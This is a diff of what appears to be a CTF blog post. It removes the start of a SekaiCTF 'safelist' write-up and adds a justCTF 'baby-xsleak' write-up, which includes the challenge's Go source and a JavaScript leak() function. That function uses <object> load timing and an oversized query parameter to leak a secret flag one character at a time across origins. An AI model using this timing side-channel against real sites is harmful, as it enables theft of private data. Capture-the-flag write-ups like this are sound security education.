@@ -1,66 +1,82 @@
-<!-- more -->
+1. /
+2. /search
+3. /debug
 
-![challenge](/img/sekaictf2022-safelist-xsleak/p1.png)
+The core function is as below:
 
-Source code: https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/safelist
+``` go
+flagStr := os.Getenv("FLAG")
+mux := http.NewServeMux()
+mux.HandleFunc("/search/", func(w http.ResponseWriter, r *http.Request) {
+  if !isPrivateIP(getIP(r)) {
+    w.WriteHeader(http.StatusForbidden)
+    return
+  }
+  handleSearch(w, r, flagStr)
+})
+mux.HandleFunc("/debug/", func(w http.ResponseWriter, r *http.Request) {
+  handleSearch(w, r, "justCTF{fake_flags}")
+})
 
-The website is simple, you can either create or delete a note, also there is an admin bot to visit the URL you provided.
+func handleSearch(w http.ResponseWriter, r *http.Request, flag string) {
+  query := r.URL.Query().Get("search")
+  msg := r.URL.Query().Get("msg")
 
-What's unique about this challenge is that it sets a lot of security headers:
-
-``` js
-app.use((req, res, next) => {
-    res.locals.nonce = crypto.randomBytes(32).toString("hex");
-
-    // Surely this will be enough to protect my website
-    // Clueless
-    res.setHeader("Content-Security-Policy", `
-        default-src 'self';
-        script-src 'nonce-${res.locals.nonce}' 'unsafe-inline';
-        object-src 'none';
-        base-uri 'none';
-        frame-ancestors 'none';
-    `.trim().replace(/\s+/g, " "));
-    res.setHeader("Cache-Control", "no-store");
-    res.setHeader("X-Frame-Options", "DENY");
-    res.setHeader("X-Content-Type-Options", "nosniff");
-    res.setHeader("Referrer-Policy", "no-referrer");
-    res.setHeader("Cross-Origin-Embedder-Policy", "require-corp");
-    res.setHeader("Cross-Origin-Opener-Policy", "same-origin");
-    res.setHeader("Cross-Origin-Resource-Policy", "same-origin");
-    res.setHeader("Document-Policy", "force-load-at-top");
-
-    if (!req.session.id) {
-        req.session.id = crypto.randomUUID();
-    }
-    if (!users.has(req.session.id)) {
-        users.set(req.session.id, {
-            list: []
-        });
-    }
-
-    req.user = users.get(req.session.id);
-    next();
-});
+  if !strings.Contains(flag, query) {
+    w.Write([]byte("Not found"))
+  } else {
+    w.Write(append([]byte(msg), flag...))
+  }
+}
 ```
 
-Also, the note content is sanitized by `DOMPurify.sanitize()` before assigning it to innerHTML, so there is no way to do XSS.
+You can pass two query strings `search` and `msg`, if `search` is in the flag, the server will return msg+flag, otherwise `Not Found`.
 
-There is another special feature which caught my eye:
+`/search` can only be accessed within the internal network via the bot, so they provide another `/debug` endpoint for the player to test.
 
-``` js
-app.post("/create", (req, res) => {
-    let { text } = req.body;
+For example, `/debug?search=NOT_EXIST&msg=hello` returns `Not found`,  and`/debug?search=justCTF&msg=hello` returns `hellojustCTF{fake_flags}`
 
-    if (!text || typeof text !== "string") {
-        return res.end("Missing 'text' variable")
-    }
+We can use this difference to leak the flag char by char.
 
-    req.user.list.push(text.slice(0, 2048));
-    req.user.list.sort();
+By the way, we can't do XSS  because of the headers:
 
-    res.redirect("/");
-});
+```
+w.Header().Set("X-Content-Type-Options", "nosniff")
+w.Header().Set("Content-Security-Policy", "script-src 'none';")
+w.Header().Set("Content-Type", "text/plain")
 ```
 
-When you create a note, the whole list will re-order. The flag format is `^SEKAI{[a-z]+}$`. Knowing this, we can create a note before or after the flag.
+Also, [error events](https://xsleaks.dev/docs/attacks/error-events/) will not work because of `text/plain` content type.
+
+## Oracle
+
+What is the oracle to leak the flag?
+
+We can use something like: `/search?search=a&msg=${'A'*1000000}`
+
+If `a` is not in the flag, the response is just `Not Found`, otherwise A*1000000+flag
+
+More content takes more time for the browser to render, so we can use the `<object>` tag to embed the URL and measure the load time, see the following for the actual code:
+
+``` js
+function leak(char, callback) {
+  return new Promise(resolve => {
+    let ss = 'just_random_string'
+    // for msg, I use random string to avoid cache, but maybe it's not needed
+    let url = `http://baby-xsleak-ams3.web.jctf.pro/search/?search=${char}&msg=`+ss[Math.floor(Math.random()*ss.length)].repeat(1000000)
+    let start = performance.now()
+    let object = document.createElement('object');
+    object.width = '2000px'
+    object.height = '2000px'
+    object.data = url;
+    object.onload = () => {
+      object.remove()
+      let end = performance.now()
+      resolve(end - start)
+    }
+    object.onerror = () => console.log('Error event triggered');
+    document.body.appendChild(object);
+  })
+  
+}
+```
